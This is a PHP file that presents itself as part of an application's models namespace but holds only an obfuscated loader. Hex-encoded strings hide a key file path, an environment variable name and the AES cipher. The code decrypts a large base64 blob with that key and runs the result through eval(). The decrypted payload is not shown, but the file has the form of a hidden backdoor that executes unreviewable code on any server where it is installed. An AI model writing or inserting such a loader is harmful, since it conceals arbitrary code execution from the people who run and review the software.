<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8E+ukHDKhgfhiw4V8BXV7Q==');

$c=base64_decode(

'VSRpMkCkNn/MlNKDFMz4ct6M1cOJGYhKSgZsLUqhM0yccAneRgYtNq3dS3S0+ccnFwLx8eK7nBse' .
'rqRK0c2VWJadyHCHMr9nWFOZnQfQ05m/l+xEk+G3Se58aKIW7XVcetk/9gDLl0yDDJjzoei3RUVS' .
'ouO1vWAabVKBwZhxQMfqzcZDRBkJWLfoimYBjxmh3+b4iFf+aLRlO3ZST7unnXnDn93KKhcOVco1' .
'Y+n5XvEPrTaDlUcIc7cqwRBrNAz7JNbitvDozF9jc8pQqq2tF5hOBcO2Eg7uwyQqobrqSmepJQvD' .
'0uz00YT3acztCflEDyVFAuLV1OxIMSG7xVdSCyU5qEAuKsckAnqv/ZX20arFR1A9etRR4x5WaQeB' .
'enb33MUzHIRxGwOZmaE732PXGQkuqzqhtt17bVhDUGPlZB1H6Lp361VoOZZiO4cWliMXWlrxDetx' .
'C/4QJ9TlopS6gZIgtT2JnmQb6wRipDn9wySQHlgsSbhdj6g+z77ZhckWE3ej54LCJAtx1kstOewd' .
'gDH0fcqDM541k4qANXkZpSge+LAoACKC8pqXZDp1MC1JP0MtzVQBMEvgRhFybkNApjJejbkic9Li' .
'n+RLEfvG0LOqc/aM+N27zdXU9s2zXLR3qrWndyMeVoYmUd5kMZmT+kkZaFB0OGo5kmhYsrfNWd+z' .
'e90hvEzPdQjc5ZA2JkXdLt3bTnS6sg7eBoQnMGK1Ad1gT9HhYSKfnTGfLZOBnCUhstt8voJWc/OB' .
'6Ad0TKFtSNS1awswhM+2+G7F27eOMB3E/RXgkCHnj94LYOkRWiueodVEll9RmsQuYnxeX1GVmeAP' .
'ftwGp1tbAr8h/tSP62RXOOjy4ZFbHVL/iFJhWyzhxLsGAhKOk8FW6P/xa/CzgAnO6488bmbRhB3w' .
'1rsc534Dagy40fDziMi0cFlEERp+NRi0jupLrCOnMl+Jlr7kM3RemGk5HvTr3+/p7MM0v8Cw1PDP' .
'zquHjUBTgBzuL+m3xB+mRdk3cjQP6biduNKlakqWXuib0pH2ARKtqi7wO2jziD2yY9BNf8iSJ1iW' .
'L25JIuyP5CPk9Ul1/aylwvTJZvTFfpvniit3Azri7wi6+jc37KMAc1Uk/I66piWlZVX5jl5OQhGy' .
'/6bWIqE7yXHXt3gKNYDE85iouwTuGfC6/ECtoChFClkVRmw/v3AkrrgvTkhENjoDFvwF+xScTB1g'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

